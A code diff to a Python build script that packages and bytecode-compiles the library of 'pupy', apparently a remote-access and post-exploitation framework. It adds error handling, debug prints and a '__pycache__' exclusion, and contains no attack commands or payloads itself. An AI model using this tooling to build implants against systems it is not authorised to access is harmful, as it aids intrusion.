@@ -4,6 +4,7 @@ from __future__ import print_function
 
 import site
 import sys
+import sysconfig
 import os
 import imp
 import marshal
@@ -24,7 +25,8 @@ print("ROOT: ", ROOT)
 PATCHES = os.path.join(ROOT, 'pupy', 'library_patches')
 
 sys.path.insert(0, PATCHES)
-sys.path.append(os.path.join(ROOT, 'pupy'))sys.path.append(os.path.join(ROOT, 'pupy', 'pupylib'))
+sys.path.append(os.path.join(ROOT, 'pupy'))
+sys.path.append(os.path.join(ROOT, 'pupy', 'pupylib'))
 
 pupycompile = __import__('PupyCompile').pupycompile
 
@@ -40,7 +42,19 @@ else:
 
 import additional_imports
 
-__import__('pupy').prepare()
+print("Load pupy")
+
+try:
+    pupy = __import__('pupy')
+    print("Module loaded")
+    pupy.prepare(debug=True)
+    print("Prepare called")
+except Exception as e:
+    print("Load pupy.. FAILED: {}".format(e))
+    raise
+
+print("Load pupy.. OK")
+
 
 sys_modules = [
     (x, sys.modules[x]) for x in sys.modules.keys()
@@ -56,8 +70,13 @@ def compile_py(path):
     fileid = len(compile_map)
     compile_map.append(path)
 
-    data = pupycompile(path, 'f:{:x}'.format(fileid), path=True)
-    print("[C] {} -> f:{:x}".format(path, fileid))
+    data = None
+
+    try:
+        data = pupycompile(path, 'f:{:x}'.format(fileid), path=True)
+        print("[C] {} -> f:{:x}".format(path, fileid))
+    except ValueError:
+        print("[C] {} -> failed".format(path))
 
     return data
 
@@ -190,7 +209,7 @@ try:
                             # Remove various testcases if any
                             if any(['/'+x+'/' in zipname for x in [
                                 'tests', 'test', 'SelfTest', 'SelfTests', 'examples',
-                                'experimental'
+                                'experimental', '__pycache__'
                             ]
                             ]):
                                 continue
@@ -210,16 +229,18 @@ try:
                                     [PATCHES] + ziproot.split('/'))
                                 ext = '.py'
 
-                            print('adding file : {}'.format(zipname))
-                            content.add(zipname)
-
                             if ext == '.py' and need_compile:
-                                zf.writestr(
-                                    zipname+'o',
-                                    compile_py(os.path.join(file_root, f+ext)))
+                                bytecode = compile_py(os.path.join(file_root, f+ext))
+                                if not bytecode:
+                                    continue
+
+                                zf.writestr(zipname+'o', bytecode)
                             else:
                                 zf.write(os.path.join(
                                     file_root, f+ext), zipname)
+
+                            print('adding file : {}'.format(zipname))
+                            content.add(zipname)
 
                             break
         else:
